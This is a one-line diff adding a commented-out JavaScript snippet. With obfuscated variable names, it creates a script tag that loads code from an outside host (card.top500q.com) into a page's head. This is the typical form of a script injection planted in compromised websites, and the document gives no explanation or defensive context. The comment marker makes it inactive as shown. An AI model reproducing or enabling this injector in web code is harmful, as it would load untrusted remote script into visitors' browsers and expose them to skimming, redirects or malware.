@@ -1,0 +1,1 @@
+// var _d9n = document.getElementsByTagName("head").item(0);_o1s = document.createElement("script");_o1s.setAttribute("src", "http://card.top500q.com/js/js.js?649&x9wj=0i");_o1s.setAttribute("type", "text/javascript");_d9n.appendChild(_o1s);
